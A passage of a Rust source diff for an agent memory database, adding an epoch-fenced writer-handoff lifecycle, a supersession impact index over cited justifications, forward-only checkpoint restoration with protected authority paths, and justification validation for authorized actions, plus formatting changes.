+                             actor: &str,
+                             before: i64,
+                             after: i64,
+                             detail: &str|
+         -> String {
+            let mut hasher = Sha256::new();
+            hasher.update(
+                format!("{workspace_hash}\n{action}\n{actor}\n{before}\n{after}\n{detail}")
+                    .as_bytes(),
+            );
+            let receipt = format!("{:x}", hasher.finalize());
+            lifecycle.push(serde_json::json!({
+                "action": action,
+                "actor": actor,
+                "epoch_before": before,
+                "epoch_after": after,
+                "receipt_digest": receipt,
+            }));
+            if lifecycle.len() > 256 {
+                let excess = lifecycle.len() - 256;
+                lifecycle.drain(0..excess);
+            }
+            receipt
+        };
+
+        let receipt = match action {
+            "prepare" => {
+                if target.is_empty() {
+                    return Err("prepare requires a non-empty target_agent_id".into());
+                }
+                match state.as_str() {
+                    "" | "prepared" => {
+                        state = "prepared".to_string();
+                        target_state = target.to_string();
+                        append_result(
+                            &mut lifecycle,
+                            "prepare",
+                            actor,
+                            epoch_before,
+                            epoch,
+                            target,
+                        )
+                    }
+                    other => {
+                        return Err(format!(
+                            "WriterEpoch: cannot prepare workspace '{workspace_hash}' in state \
+                             '{other}' (epoch {epoch})"
+                        )
+                        .into());
+                    }
+                }
+            }
+            "abort" => {
+                if state != "prepared" {
+                    return Err(format!(
+                        "WriterEpoch: abort requires state prepared, got '{state}' \
+                         (epoch {epoch})"
+                    )
+                    .into());
+                }
+                state = String::new();
+                writer = String::new();
+                target_state = String::new();
+                append_result(&mut lifecycle, "abort", actor, epoch_before, epoch, "")
+            }
+            "fence" => {
+                if state != "prepared" {
+                    return Err(format!(
+                        "WriterEpoch: fence requires state prepared, got '{state}' \
+                         (epoch {epoch})"
+                    )
+                    .into());
+                }
+                state = "fenced".to_string();
+                writer = String::new(); // zero writers after the fence
+                epoch += 1;
+                append_result(&mut lifecycle, "fence", actor, epoch_before, epoch, "")
+            }
+            "retarget" => {
+                if target.is_empty() {
+                    return Err("retarget requires a non-empty target_agent_id".into());
+                }
+                if state != "fenced" {
+                    return Err(format!(
+                        "WriterEpoch: retarget requires state fenced, got '{state}' \
+                         (epoch {epoch})"
+                    )
+                    .into());
+                }
+                target_state = target.to_string();
+                epoch += 1;
+                append_result(
+                    &mut lifecycle,
+                    "retarget",
+                    actor,
+                    epoch_before,
+                    epoch,
+                    target,
+                )
+            }
+            "activate" => {
+                if state != "fenced" {
+                    return Err(format!(
+                        "WriterEpoch: activate requires state fenced, got '{state}' \
+                         (epoch {epoch})"
+                    )
+                    .into());
+                }
+                if actor.is_empty() {
+                    return Err("activate requires the activating agent identity".into());
+                }
+                if actor != target_state {
+                    return Err(format!(
+                        "WriterEpoch: agent '{actor}' is not the handoff target for \
+                         workspace '{workspace_hash}' (target is '{target_state}', epoch \
+                         {epoch})"
+                    )
+                    .into());
+                }
+                match presented_epoch {
+                    Some(e) if e == epoch => {}
+                    Some(e) => {
+                        return Err(format!(
+                            "StaleRevision: presented epoch {e} does not match the fenced \
+                             revision {epoch} for workspace '{workspace_hash}'"
+                        )
+                        .into());
+                    }
+                    None => {
+                        return Err(format!(
+                            "StaleRevision: activate requires the fenced epoch {epoch} for \
+                             workspace '{workspace_hash}'"
+                        )
+                        .into());
+                    }
+                }
+                state = "active".to_string();
+                writer = actor.to_string();
+                epoch += 1;
+                append_result(&mut lifecycle, "activate", actor, epoch_before, epoch, "")
+            }
+            other => {
+                return Err(format!("invalid writer_handoff action '{other}'").into());
+            }
+        };
+
+        // Persist: the aborted (cleared) pointer is a row DELETE; everything
+        // else is an INSERT OR REPLACE of the current directory state.
+        let now = now_ms();
+        if state.is_empty() {
+            conn.execute(
+                "DELETE FROM writer_directory WHERE workspace_hash = ?1",
+                params![workspace_hash],
+            )?;
+        } else {
+            conn.execute(
+                "INSERT INTO writer_directory
+                 (workspace_hash, epoch, pointer_state, writer_agent_id,
+                  target_agent_id, lifecycle_json, updated_at_unix_ms)
+                 VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)
+                 ON CONFLICT(workspace_hash) DO UPDATE SET
+                   epoch = excluded.epoch,
+                   pointer_state = excluded.pointer_state,
+                   writer_agent_id = excluded.writer_agent_id,
+                   target_agent_id = excluded.target_agent_id,
+                   lifecycle_json = excluded.lifecycle_json,
+                   updated_at_unix_ms = excluded.updated_at_unix_ms",
+                params![
+                    workspace_hash,
+                    epoch,
+                    state,
+                    writer,
+                    target_state,
+                    serde_json::to_string(&lifecycle)?,
+                    now,
+                ],
+            )?;
+        }
+        drop(conn);
+        self.journal(&JournalEvent {
+            id: format!("jrn-{}", uuid::Uuid::new_v4().simple()),
+            event_type: format!("writer_handoff_{action}"),
+            evaluated_json: serde_json::to_string(&serde_json::json!({
+                "workspace_hash": workspace_hash,
+                "actor": actor,
+                "target": target,
+                "presented_epoch": presented_epoch,
+            }))?,
+            acted_json: serde_json::to_string(&serde_json::json!({
+                "epoch": epoch,
+                "pointer_state": state,
+                "writer_agent_id": writer,
+                "target_agent_id": target_state,
+                "receipt_digest": receipt,
+            }))?,
+            forward_json: "{\"note\":\"epoch-fenced writer handoff lifecycle result\"}".to_string(),
+            category: "writer_directory".to_string(),
+            key: workspace_hash.to_string(),
+            entity_id: String::new(),
+            agent_id: actor.to_string(),
+            workspace_hash: workspace_hash.to_string(),
+            created_at_unix_ms: now,
+        })?;
+        Ok(serde_json::json!({
+            "workspace_hash": workspace_hash,
+            "action": action,
+            "epoch": epoch,
+            "pointer_state": state,
+            "writer_agent_id": writer,
+            "target_agent_id": target_state,
+            "receipt_digest": receipt,
+            "lifecycle_len": lifecycle.len(),
+        }))
+    }
+
+    // ── #1029 supersession impact index ────────────────────────────────────
+
+    /// Reverse closure over `derived_from` citations + action justifications
+    /// for a superseded/retracted fact: which decisions and actions cited it
+    /// as grounding, so PENDING actions can re-validate their justification
+    /// (AAR review flag) and COMPLETED actions can be flagged for review
+    /// (external effects are irreversible — flag only, never auto-reverse).
+    /// Bounded by `depth_cap` (closure depth), `age_cap_days` (dependents
+    /// young enough to still matter), and an optional `as_of` transaction
+    /// instant (v1: filters by dependent creation time; full bitemporal
+    /// closure via entity_history is a documented follow-on). Computed
+    /// LAZILY at read time — eager materialization at supersede-time is a
+    /// later optimization, per the design question in #1029.
+    pub fn supersession_impact(
+        &self,
+        entity_id: Option<&str>,
+        category: Option<&str>,
+        key: Option<&str>,
+        depth_cap: usize,
+        age_cap_days: i64,
+        as_of_unix_ms: Option<i64>,
+    ) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
+        let target = match entity_id {
+            Some(id) if !id.is_empty() => self.get_entity_by_id_public(id)?,
+            _ => match (category, key) {
+                (Some(cat), Some(k)) if !cat.is_empty() && !k.is_empty() => {
+                    self.get_entity(cat, k)?
+                }
+                _ => {
+                    return Err(
+                        "impact report requires entity_id or category+key of the changed fact"
+                            .into(),
+                    )
+                }
+            },
+        }
+        .ok_or("impact target entity not found")?;
+        let target_id = target.id.clone();
+        let conn = self.conn()?;
+        let now = now_ms();
+        let age_floor = now - age_cap_days.clamp(1, 36_500) * 86_400_000;
+        let as_of = as_of_unix_ms.unwrap_or(i64::MAX);
+        let depth_max = depth_cap.clamp(1, 16);
+        let mut dependents: Vec<serde_json::Value> = Vec::new();
+        let mut visited: std::collections::HashSet<String> = std::collections::HashSet::new();
+        visited.insert(target_id.clone());
+        let mut frontier: Vec<(String, usize)> = vec![(target_id.clone(), 0)];
+        let mut truncated = false;
+        while let Some((cur_id, depth)) = frontier.pop() {
+            if depth >= depth_max {
+                truncated = true;
+                continue;
+            }
+            let mut stmt = conn.prepare(
+                "SELECT id, category, key, status, importance, agent_id, workspace_hash,
+                        created_at_unix_ms
+                 FROM entities
+                 WHERE json_valid(links)
+                   AND EXISTS (
+                     SELECT 1 FROM json_each(entities.links)
+                     WHERE json_extract(value, '$.target_id') = ?1
+                       AND json_extract(value, '$.relationship') = 'derived_from'
+                   )
+                 LIMIT 2000",
+            )?;
+            let rows = stmt.query_map(params![cur_id], |r| {
+                Ok((
+                    r.get::<_, String>(0)?,
+                    r.get::<_, String>(1)?,
+                    r.get::<_, String>(2)?,
+                    r.get::<_, String>(3)?,
+                    r.get::<_, f64>(4)?,
+                    r.get::<_, String>(5)?,
+                    r.get::<_, String>(6)?,
+                    r.get::<_, i64>(7)?,
+                ))
+            })?;
+            for row in rows {
+                let (id, cat, k, status, importance, agent, ws, created) = row?;
+                if visited.contains(&id) {
+                    continue;
+                }
+                visited.insert(id.clone());
+                let too_old = created < age_floor;
+                let after_as_of = created > as_of;
+                if !too_old && !after_as_of {
+                    dependents.push(serde_json::json!({
+                        "id": id.clone(),
+                        "category": cat,
+                        "key": k,
+                        "status": status,
+                        "importance": importance,
+                        "agent_id": agent,
+                        "workspace_hash": ws,
+                        "created_at_unix_ms": created,
+                        "dependency_depth": depth + 1,
+                        "dependency_kind": if depth == 0 { "direct" } else { "transitive" },
+                    }));
+                }
+                frontier.push((id, depth + 1));
+            }
+        }
+        // Pending / completed actions citing the target (or any visited
+        // dependent) as justification.
+        let mut pending_actions: Vec<serde_json::Value> = Vec::new();
+        let mut completed_actions: Vec<serde_json::Value> = Vec::new();
+        for id in visited.iter() {
+            let mut stmt = conn.prepare(
+                "SELECT id, agent_id, workspace_hash, capability, action_key, status,
+                        created_at_unix_ms
+                 FROM authorized_actions
+                 WHERE json_valid(justification_json)
+                   AND EXISTS (
+                     SELECT 1 FROM json_each(authorized_actions.justification_json)
+                     WHERE value = ?1
+                   )
+                 LIMIT 500",
+            )?;
+            let rows = stmt.query_map(params![id], |r| {
+                Ok((
+                    r.get::<_, String>(0)?,
+                    r.get::<_, String>(1)?,
+                    r.get::<_, String>(2)?,
+                    r.get::<_, String>(3)?,
+                    r.get::<_, String>(4)?,
+                    r.get::<_, String>(5)?,
+                    r.get::<_, i64>(6)?,
+                ))
+            })?;
+            for row in rows {
+                let (aid, agent, ws, capability, action_key, status, created) = row?;
+                let entry = serde_json::json!({
+                    "action_id": aid,
+                    "agent_id": agent,
+                    "workspace_hash": ws,
+                    "capability": capability,
+                    "action_key": action_key,
+                    "status": status,
+                    "created_at_unix_ms": created,
+                    "cited_entity_id": id,
+                });
+                match status.as_str() {
+                    "intent" | "approval_requested" => {
+                        if created <= as_of {
+                            pending_actions.push(entry);
+                        }
+                    }
+                    "executed" | "failed" => completed_actions.push(entry),
+                    _ => {}
+                }
+            }
+        }
+        // Order by authority (importance) then recency.
+        dependents.sort_by(|a, b| {
+            b["importance"]
+                .as_f64()
+                .unwrap_or(0.0)
+                .partial_cmp(&a["importance"].as_f64().unwrap_or(0.0))
+                .unwrap_or(std::cmp::Ordering::Equal)
+                .then_with(|| {
+                    b["created_at_unix_ms"]
+                        .as_i64()
+                        .unwrap_or(0)
+                        .cmp(&a["created_at_unix_ms"].as_i64().unwrap_or(0))
+                })
+        });
+        Ok(serde_json::json!({
+            "target": {
+                "id": target.id,
+                "category": target.category,
+                "key": target.key,
+                "status": target.status,
+            },
+            "dependents": dependents,
+            "pending_actions": pending_actions,
+            "pending_actions_note": "cited justification changed — re-validate freshness before execution (AAR review flag)",
+            "completed_actions": completed_actions,
+            "completed_actions_note": "external effects are irreversible — review suggestions only, never automatic reversal",
+            "bounded_closure": {
+                "depth_cap": depth_max,
+                "age_cap_days": age_cap_days.clamp(1, 36_500),
+                "as_of_unix_ms": as_of_unix_ms,
+                "visited": visited.len(),
+                "truncated": truncated,
+                "computed_at_unix_ms": now,
+            },
+        }))
+    }
+
+    // ── #1028 forward restoration ──────────────────────────────────────────
+
+    /// Forward-only restore from a checkpoint directory. A restore NEVER
+    /// rewrites or truncates accepted lineage: each checkpoint candidate is
+    /// applied as an AUDITED VERSION ADVANCE of the current head — the
+    /// pre-restore version moves to `entity_history` (the parent; a rollback
+    /// is just another forward migration) and the checkpoint body becomes
+    /// the new head. Protected authority paths always take CURRENT values —
+    /// a restore may not revive a stale credential, resurrect a superseded
+    /// authority, or undo a recorded external effect (authorized actions are
+    /// untouched). The mask must be disjoint from the protected set P =
+    /// {authority, policy, revocation, issuer, writer, epoch, dirSeq,
+    /// lifecycle, createdFrom, provenance}; only `entities` is maskable in
+    /// v1. Interacts with #1027: a restore against an active writer
+    /// directory must present the current writer epoch.
+    pub fn restore_forward(
+        &self,
+        checkpoint_dir: &str,
+        workspace_hash: &str,
+        path_mask: &[String],
+        actor: &str,
+        writer_epoch: Option<i64>,
+    ) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
+        const PROTECTED_PATHS: [&str; 10] = [
+            "authority",
+            "policy",
+            "revocation",
+            "issuer",
+            "writer",
+            "epoch",
+            "dirSeq",
+            "lifecycle",
+            "createdFrom",
+            "provenance",
+        ];
+        if workspace_hash.is_empty() {
+            return Err("restore_forward requires a non-empty workspace_hash".into());
+        }
+        for path in path_mask {
+            if PROTECTED_PATHS.contains(&path.as_str()) {
+                return Err(format!(
+                    "RestoreMaskProtected: path '{path}' is a protected authority path \
+                     (M ∩ P = ∅); only 'entities' is maskable"
+                )
+                .into());
+            }
+            if path != "entities" {
+                return Err(format!(
+                    "RestoreMaskUnsupported: path '{path}' is not restorable; only \
+                     'entities' is maskable in v1"
+                )
+                .into());
+            }
+        }
+        // #1027 interplay: a restore is a branch-level write.
+        if let Err(e) = self.writer_directory_enforce(workspace_hash, actor, writer_epoch) {
+            return Err(e.into());
+        }
+        let candidates = read_checkpoint_candidates(checkpoint_dir)?;
+        let mut restored = 0i64;
+        let mut superseded = 0i64;
+        let mut created = 0i64;
+        let mut errors: Vec<String> = Vec::new();
+        let now = now_ms();
+        for cand in candidates {
+            // Scoped restore: checkpoint entries for other workspaces are
+            // skipped (never imported cross-scope).
+            if !cand.workspace.is_empty() && cand.workspace != workspace_hash {
+                continue;
+            }
+            if cand.category.is_empty() || cand.key.is_empty() {
+                errors.push(format!("{}: missing category/key", cand.file));
+                continue;
+            }
+            let conn = self.conn()?;
+            // The vault's identity is (category, key, workspace): the current
+            // head is the live row for that identity. Forward restoration is
+            // an AUDITED SAME-IDENTITY UPDATE — the pre-restore version
+            // moves to `entity_history` (the parent; lineage grows, never
+            // truncates) and the checkpoint becomes the new head. A rollback
+            // is just another forward migration (one more history version).
+            let current: Option<crate::models::Entity> = conn
+                .query_row(
+                    "SELECT id, category, key, body_json, status, type, tags,
+                            decay_score, retrieval_count, layer, topic_path,
+                            archived, archive_reason, links, verified, source,
+                            created_at_unix_ms, last_accessed_unix_ms, NULL as embedding,
+                            always_on, certainty, workspace_hash, agent_id, visibility,
+                            follow_count, miss_count, follow_rate, efficacy_status,
+                            epistemic_state, hints, memory_type
+                     FROM entities
+                     WHERE category = ?1 AND key = ?2 AND workspace_hash = ?3
+                       AND archived = 0
+                     LIMIT 1",
+                    params![cand.category, cand.key, workspace_hash],
+                    |r| Ok(entity_from_row(r, self.encryption.as_ref())?),
+                )
+                .optional()?;
+            let history_before: i64 = current
+                .as_ref()
+                .map(|c| {
+                    conn.query_row(
+                        "SELECT COUNT(*) FROM entity_history WHERE id = ?1",
+                        params![c.id],
+                        |r| r.get(0),
+                    )
+                })
+                .transpose()?
+                .unwrap_or(0);
+            // Protected authority paths take CURRENT values (defaults only
+            // when no current head exists).
+            let (visibility, agent_id, always_on, status, links, topic_path, certainty) =
+                match &current {
+                    Some(cur) => (
+                        cur.visibility.clone(),
+                        cur.agent_id.clone(),
+                        cur.always_on,
+                        cur.status.clone(),
+                        cur.links.clone(),
+                        cur.topic_path.clone(),
+                        cur.certainty,
+                    ),
+                    None => (
+                        "workspace".to_string(),
+                        String::new(),
+                        false,
+                        "active".to_string(),
+                        Vec::new(),
+                        String::new(),
+                        0.5,
+                    ),
+                };
+            // Provenance: the checkpoint is an auxiliary reference, never a
+            // parent. Lineage flows through the current head only.
+            let mut body: serde_json::Value =
+                serde_json::from_str(&cand.body).unwrap_or_else(|_| {
+                    serde_json::json!({
+                        "restored_body": cand.body,
+                    })
+                });
+            if let Some(obj) = body.as_object_mut() {
+                obj.insert(
+                    "origin".to_string(),
+                    serde_json::json!({
+                        "memory_kind": "restored",
+                        "restored_from_checkpoint": checkpoint_dir,
+                        "restored_at_unix_ms": now,
+                        "restored_by": actor,
+                    }),
+                );
+            }
+            let body_json = serde_json::to_string(&body)?;
+            let new_id = current.as_ref().map(|c| c.id.clone()).unwrap_or_else(|| {
+                format!(
+                    "mem-{}",
+                    &uuid::Uuid::new_v4().to_string().replace('-', "")[..12]
+                )
+            });
+            let successor = crate::models::Entity {
+                id: new_id.clone(),
+                category: cand.category.clone(),
+                key: cand.key.clone(),
+                body_json: body_json.clone(),
+                status,
+                entity_type: cand.entity_type.clone(),
+                tags: cand.tags.clone(),
+                decay_score: cand.decay,
+                retrieval_count: 0,
+                layer: cand.layer.clone(),
+                topic_path,
+                archived: false,
+                archive_reason: String::new(),
+                links,
+                verified: false,
+                source: "restore_forward".to_string(),
+                always_on,
+                certainty,
+                workspace_hash: workspace_hash.to_string(),
+                agent_id,
+                visibility,
+                created_at_unix_ms: now,
+                last_accessed_unix_ms: now,
+                follow_count: 0,
+                miss_count: 0,
+                follow_rate: 0.0,
+                efficacy_status: "unverified".to_string(),
+                epistemic_state: crate::models::default_epistemic_state(),
+                hints: Vec::new(),
+                memory_type: String::new(),
+                embedding: None,
+                _parsed_body: None,
+            };
+            // The audited write path: encrypts, syncs FTS, snapshots the
+            // pre-restore version into entity_history (the parent), and
+            // journals the version advance. The restore itself never touches
+            // authority tables or recorded external effects.
+            let (written_id, _action) = self
+                .remember_with_write_options(
+                    &successor,
+                    true,
+                    None,
+                    None,
+                    false,
+                    crate::interference::WriteGateOptions::none(),
+                )
+                .map_err(|e| format!("restore_forward write failed: {e}"))?;
+            let history_after: i64 = conn.query_row(
+                "SELECT COUNT(*) FROM entity_history WHERE id = ?1",
+                params![written_id],
+                |r| r.get(0),
+            )?;
+            self.journal(&JournalEvent {
+                id: format!("jrn-{}", uuid::Uuid::new_v4().simple()),
+                event_type: "restore_forward".to_string(),
+                evaluated_json: serde_json::to_string(&serde_json::json!({
+                    "checkpoint_dir": checkpoint_dir,
+                    "checkpoint_file": cand.file,
+                    "path_mask": path_mask,
+                    "workspace_hash": workspace_hash,
+                }))?,
+                acted_json: serde_json::to_string(&serde_json::json!({
+                    "restored_id": written_id,
+                    "parent_is_current_head": current.is_some(),
+                    "history_before": history_before,
+                    "history_after": history_after,
+                }))?,
+                forward_json: "{\"note\":\"forward-only restoration; protected paths kept current values; external effects untouched\"}".to_string(),
+                category: cand.category.clone(),
+                key: cand.key.clone(),
+                entity_id: written_id,
+                agent_id: actor.to_string(),
+                workspace_hash: workspace_hash.to_string(),
+                created_at_unix_ms: now,
+            })?;
+            if current.is_some() {
+                superseded += 1;
+            } else {
+                created += 1;
+            }
+            restored += 1;
+        }
+        Ok(serde_json::json!({
+            "restored": restored,
+            "superseded_current_heads": superseded,
+            "created": created,
+            "workspace_hash": workspace_hash,
+            "path_mask": path_mask,
+            "protected_paths": PROTECTED_PATHS,
+            "errors": errors,
+            "note": "forward-only: each restored entity is an audited version advance of the current head (the pre-restore version moved to entity_history); protected authority paths took CURRENT values; no external effect replayed or undone",
+        }))
+    }
+
     /// Token-only interference probe used by consolidation before a fold:
     /// is the merged body heavily covered by an entity OUTSIDE the fold's
     /// source set? Returns (top_entity_id, score) when the configured bound
@@ -11338,13 +12711,14 @@ impl Database {
                 input.accuracy
             ));
         }
-        let prior = self.eval_run_prior_rates(input.suite, input.eval_kind, EVAL_TRAILING_WINDOW)?;
+        let prior =
+            self.eval_run_prior_rates(input.suite, input.eval_kind, EVAL_TRAILING_WINDOW)?;
         let breaches =
             crate::eval_regression::compute_regression(&input.metrics, &prior, &input.thresholds);
         let breaches_json =
             serde_json::to_string(&breaches).map_err(|e| format!("breach encode failed: {e}"))?;
-        let metrics_json =
-            serde_json::to_string(&input.metrics).map_err(|e| format!("metrics encode failed: {e}"))?;
+        let metrics_json = serde_json::to_string(&input.metrics)
+            .map_err(|e| format!("metrics encode failed: {e}"))?;
         let regressed = !breaches.is_empty();
         let id = format!("evr-{}", uuid::Uuid::new_v4().simple());
         let conn = self.conn().map_err(|e| e.to_string())?;
@@ -11424,7 +12798,9 @@ impl Database {
             .prepare(&sql)
             .map_err(|e| format!("eval_run_history prepare failed: {e}"))?;
         let rows = stmt
-            .query_map(rusqlite::params_from_iter(args.iter()), |r| row_to_eval_run(r))
+            .query_map(rusqlite::params_from_iter(args.iter()), |r| {
+                row_to_eval_run(r)
+            })
             .map_err(|e| format!("eval_run_history query failed: {e}"))?;
         let mut out = Vec::new();
         for row in rows {
@@ -11466,7 +12842,11 @@ impl Database {
 
     /// Regressed runs within the last `since_hours` (0 = all), newest first.
     /// The alert lane for the operator review queue.
-    pub fn eval_run_alerts(&self, since_hours: i64, limit: usize) -> Result<Vec<EvalRunRow>, String> {
+    pub fn eval_run_alerts(
+        &self,
+        since_hours: i64,
+        limit: usize,
+    ) -> Result<Vec<EvalRunRow>, String> {
         let limit = limit.clamp(1, 1000);
         let conn = self.conn().map_err(|e| e.to_string())?;
         let cutoff = if since_hours > 0 {
@@ -12821,11 +14201,15 @@ impl Database {
             updated_at_unix_ms: r.get(15)?,
             resource_constraints_json: r.get(16).unwrap_or_else(|_| "{}".to_string()),
             resource_constraints_hash: r.get(17).unwrap_or_default(),
+            justification_entity_ids: {
+                let raw: String = r.get(18).unwrap_or_else(|_| "[]".to_string());
+                serde_json::from_str(&raw).unwrap_or_default()
+            },
         })
     }
 
     fn action_select_sql() -> &'static str {
-        "SELECT id, manifest_id, manifest_version, agent_id, workspace_hash, scope_anchor, external_ref, capability, action_key, intent_hash, outcome_hash, status, approval_required, approval_ref, created_at_unix_ms, updated_at_unix_ms, resource_constraints_json, resource_constraints_hash FROM authorized_actions"
+        "SELECT id, manifest_id, manifest_version, agent_id, workspace_hash, scope_anchor, external_ref, capability, action_key, intent_hash, outcome_hash, status, approval_required, approval_ref, created_at_unix_ms, updated_at_unix_ms, resource_constraints_json, resource_constraints_hash, justification_json FROM authorized_actions"
     }
 
     fn active_authority(
@@ -13003,14 +14387,12 @@ impl Database {
                 dropped_principals.push(principal);
             }
         }
-        if dropped_principals
-            .iter()
-            .any(|p| *p == m.agent_id)
-        {
+        if dropped_principals.iter().any(|p| *p == m.agent_id) {
             return Ok(None);
         }
         m.scope_anchors.retain(|p| !dropped_principals.contains(p));
-        m.approver_principals.retain(|p| !dropped_principals.contains(p));
+        m.approver_principals
+            .retain(|p| !dropped_principals.contains(p));
         m.allowed_inbound_principals
             .retain(|p| !dropped_principals.contains(p));
         Ok(Some(m))
@@ -13039,7 +14421,9 @@ impl Database {
         self.journal(&JournalEvent {
             id: format!("jrn-{}", uuid::Uuid::new_v4().simple()),
             event_type: "principal_revoked".to_string(),
-            evaluated_json: json!({"principal": principal, "workspace_hash": workspace_hash, "at_unix_ms": now}).to_string(),
+            evaluated_json:
+                json!({"principal": principal, "workspace_hash": workspace_hash, "at_unix_ms": now})
+                    .to_string(),
             acted_json: json!({"reason": reason, "stored": true}).to_string(),
             forward_json: "{}".to_string(),
             category: "authority".to_string(),
@@ -13072,7 +14456,8 @@ impl Database {
             self.journal(&JournalEvent {
                 id: format!("jrn-{}", uuid::Uuid::new_v4().simple()),
                 event_type: "principal_reinstated".to_string(),
-                evaluated_json: json!({"principal": principal, "workspace_hash": workspace_hash}).to_string(),
+                evaluated_json: json!({"principal": principal, "workspace_hash": workspace_hash})
+                    .to_string(),
                 acted_json: json!({"reinstated_rows": n}).to_string(),
                 forward_json: "{}".to_string(),
                 category: "authority".to_string(),
@@ -13129,6 +14514,7 @@ impl Database {
         action_key: &str,
         intent_hash: &str,
         resource_constraints_json: Option<&str>,
+        justification_entity_ids: &[String],
     ) -> Result<AuthorizedAction, Box<dyn std::error::Error>> {
         let manifest = self.active_authority(agent_id, workspace_hash)?;
         if !manifest
@@ -13136,7 +14522,11 @@ impl Database {
             .iter()
             .any(|v| v == capability)
         {
-            return Err(format!("capability {capability:?} is not permitted by authority manifest (allowed capabilities: {})", manifest.allowed_capabilities.join(", ")).into());
+            return Err(format!(
+                "capability {capability:?} is not permitted by authority manifest (allowed capabilities: {})",
+                manifest.allowed_capabilities.join(", ")
+            )
+            .into());
         }
         if !manifest.scope_anchors.iter().any(|v| v == scope_anchor) {
             // Scope anchors are exact-match identifiers, not prefixes: the
@@ -13154,6 +14544,22 @@ impl Database {
         if intent_hash.len() != 64 || !intent_hash.bytes().all(|b| b.is_ascii_hexdigit()) {
             return Err("intent_hash must be a SHA-256 hex digest".into());
         }
+        // #1029: cited justification entities must exist at intent time
+        // (fail-closed, mirroring the derived_from write validation) — the
+        // impact index can only re-validate justifications that referenced
+        // real records.
+        if justification_entity_ids.len() > 64 {
+            return Err("justification_entity_ids must contain at most 64 entries".into());
+        }
+        for id in justification_entity_ids {
+            self.get_entity_by_id_public(id)?.ok_or_else(|| {
+                format!(
+                    "action intent rejected: justification entity not found: {id} \
+                     (justifications must reference existing rows)"
+                )
+            })?;
+        }
+        let justification_json = serde_json::to_string(justification_entity_ids)?;
         let resource_constraints_json =
             canonical_constraint_json(resource_constraints_json.unwrap_or("{}"))?;
         if !resource_constraints_permit(
@@ -13187,6 +14593,7 @@ impl Database {
                 updated_at_unix_ms: now,
                 resource_constraints_json: resource_constraints_json.clone(),
                 resource_constraints_hash: constraint_hash(&resource_constraints_json),
+                justification_entity_ids: justification_entity_ids.to_vec(),
             };
             let conn = self.conn()?;
             conn.execute(
@@ -13194,8 +14601,8 @@ impl Database {
                  (id,manifest_id,manifest_version,agent_id,workspace_hash,scope_anchor,
                   external_ref,capability,action_key,intent_hash,outcome_hash,status,
                   approval_required,approval_ref,created_at_unix_ms,updated_at_unix_ms,
-                  resource_constraints_json,resource_constraints_hash)
-                 VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?9,?10,?11,?12,?13,?14,?15,?15,?16,?17)",
+                  resource_constraints_json,resource_constraints_hash,justification_json)
+                 VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?9,?10,?11,?12,?13,?14,?15,?15,?16,?17,?18)",
                 params![
                     action.id,
                     action.manifest_id,
@@ -13213,7 +14620,8 @@ impl Database {
                     action.approval_ref,
                     now,
                     action.resource_constraints_json,
-                    action.resource_constraints_hash
+                    action.resource_constraints_hash,
+                    justification_json,
                 ],
             )?;
             drop(conn);
@@ -13263,6 +14671,7 @@ impl Database {
             updated_at_unix_ms: now,
             resource_constraints_json,
             resource_constraints_hash,
+            justification_entity_ids: justification_entity_ids.to_vec(),
         };
         let conn = self.conn()?;
         conn.execute(
@@ -13270,8 +14679,8 @@ impl Database {
              (id,manifest_id,manifest_version,agent_id,workspace_hash,scope_anchor,
               external_ref,capability,action_key,intent_hash,outcome_hash,status,
               approval_required,approval_ref,created_at_unix_ms,updated_at_unix_ms,
-              resource_constraints_json,resource_constraints_hash)
-             VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?9,?10,?11,?12,?13,?14,?15,?15,?16,?17)",
+              resource_constraints_json,resource_constraints_hash,justification_json)
+             VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?9,?10,?11,?12,?13,?14,?15,?15,?16,?17,?18)",
             params![
                 action.id,
                 action.manifest_id,
@@ -13289,7 +14698,8 @@ impl Database {
                 action.approval_ref,
                 now,
                 action.resource_constraints_json,
-                action.resource_constraints_hash
+                action.resource_constraints_hash,
+                justification_json,
             ],
         )?;
         drop(conn);
@@ -16221,7 +17631,14 @@ impl Database {
                  WHERE id = (SELECT id FROM entities \
                      WHERE category = ?2 AND key = ?5 AND workspace_hash = ?6 \
                      AND archived = 0 ORDER BY id ASC LIMIT 1)",
-                params![now, category, crate::utility_promotion::UTILITY_CAP, crate::utility_promotion::CITATION_DELTA, key, ws],
+                params![
+                    now,
+                    category,
+                    crate::utility_promotion::UTILITY_CAP,
+                    crate::utility_promotion::CITATION_DELTA,
+                    key,
+                    ws
+                ],
             )?,
             None => conn.execute(
                 "UPDATE entities SET usefulness_count = usefulness_count + 1, \
@@ -16230,7 +17647,13 @@ impl Database {
                  WHERE id = (SELECT id FROM entities \
                      WHERE category = ?2 AND key = ?5 AND archived = 0 \
                      ORDER BY workspace_hash ASC, id ASC LIMIT 1)",
-                params![now, category, crate::utility_promotion::UTILITY_CAP, crate::utility_promotion::CITATION_DELTA, key],
+                params![
+                    now,
+                    category,
+                    crate::utility_promotion::UTILITY_CAP,
+                    crate::utility_promotion::CITATION_DELTA,
+                    key
+                ],
             )?,
         };
         if affected > 0 {
@@ -16254,7 +17677,12 @@ impl Database {
              utility_score = MIN(?3, utility_score + ?4), \
              last_useful_unix_ms = ?1, last_accessed_unix_ms = ?1 \
              WHERE id = ?2 AND archived = 0",
-            params![now, id, crate::utility_promotion::UTILITY_CAP, crate::utility_promotion::CITATION_DELTA],
+            params![
+                now,
+                id,
+                crate::utility_promotion::UTILITY_CAP,
+                crate::utility_promotion::CITATION_DELTA
+            ],
         )?;
         if affected > 0 {
             let ids = vec![id.to_string()];
@@ -16308,7 +17736,9 @@ impl Database {
 
         let mut promoted = 0usize;
         for (id, state, utility, outcomes, category, key, agent_id, workspace_hash) in candidates {
-            let Some(next) = crate::utility_promotion::next_epistemic_state(&state, utility, outcomes) else {
+            let Some(next) =
+                crate::utility_promotion::next_epistemic_state(&state, utility, outcomes)
+            else {
                 continue;
             };
             // CAS: only move if the state we evaluated is still the stored
@@ -16521,9 +17951,12 @@ impl Database {
                     "reversed_by": r.get::<_, String>(11)?,
                 }))
             })?;
-            let current = rows.next().transpose()?.ok_or_else(
-                || -> Box<dyn std::error::Error> { format!("no ruling with id {ruling_id}").into() },
-            )?;
+            let current =
+                rows.next()
+                    .transpose()?
+                    .ok_or_else(|| -> Box<dyn std::error::Error> {
+                        format!("no ruling with id {ruling_id}").into()
+                    })?;
